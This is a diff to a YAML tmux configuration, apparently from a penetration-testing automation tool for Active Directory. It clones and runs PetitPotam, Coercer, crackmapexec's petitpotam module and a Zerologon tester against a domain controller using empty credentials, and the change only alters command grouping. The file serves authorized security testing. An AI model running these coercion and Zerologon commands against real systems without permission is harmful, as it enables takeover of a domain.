@@ -93,13 +93,13 @@ windows:
           - crackmapexec smb $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '' -p '' -d <%= @settings["domain"] %> -M petitpotam | tee <%= @settings["rootDir"] %>/scans/petitpotam-unauthd.txt
         - PetitPotam.py:
           - tmux select-pane -T 'PetitPotam.py' -t "unauthd:coercAuth.1"
-          - cd <%= @settings["toolDir"] %>/PetitPotam || (git clone https://github.com/topotam/PetitPotam.git <%= @settings["toolDir"] %>/PetitPotam && cd <%= @settings["toolDir"] %>/PetitPotam)
+          - cd <%= @settings["toolDir"] %>/PetitPotam || git clone https://github.com/topotam/PetitPotam.git <%= @settings["toolDir"] %>/PetitPotam && cd <%= @settings["toolDir"] %>/PetitPotam
           - deviceIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
           - python3 PetitPotam.py -u '' -p '' -d <%= @settings["domain"] %> $deviceIP $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1)
           - echo "Note eth0 is the default deviceIP used; modify deviceIP as needed"
         - Coercer:
           - tmux select-pane -T 'Coercer' -t "unauthd:coercAuth.2"
-          - cd <%= @settings["toolDir"] %>/Coercer || (git clone https://github.com/p0dalirius/Coercer.git <%= @settings["toolDir"] %>/Coercer && cd <%= @settings["toolDir"] %>/Coercer && pipenv install)
+          - cd <%= @settings["toolDir"] %>/Coercer || git clone https://github.com/p0dalirius/Coercer.git <%= @settings["toolDir"] %>/Coercer && cd <%= @settings["toolDir"] %>/Coercer && pipenv install
           - deviceIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
           - pipenv run python3 Coercer.py coerce -l $deviceIP -t $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u "" -p "" -d <%= @settings["domain"] %> -v
           - echo "Note eth0 is the default deviceIP used; modify deviceIP as needed"
@@ -107,7 +107,7 @@ windows:
       panes:
         - zerologon:
           - tmux select-pane -T 'zerologon' -t "unauthd:bigName.0"
-          - cd <%= @settings["toolDir"] %>/CVE-2020-1472 || (git clone https://github.com/SecuraBV/CVE-2020-1472.git <%= @settings["toolDir"] %>/CVE-2020-1472 && cd <%= @settings["toolDir"] %>/CVE-2020-1472/ && pipenv install)
+          - cd <%= @settings["toolDir"] %>/CVE-2020-1472 || git clone https://github.com/SecuraBV/CVE-2020-1472.git <%= @settings["toolDir"] %>/CVE-2020-1472 && cd <%= @settings["toolDir"] %>/CVE-2020-1472/ && pipenv install
           - dig any _kerberos._tcp.<%= @settings["domain"] %>
           - <%= @settings["prefill"] %> 'pipenv run zerologon_tester.py $DC-netbiosName $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/scans/zerologon.txt'; echo -e "\e[0;31mIF VULNERABLE INFORM CLIENT & TECH LEAD\033[0m"
         - blueKeep:
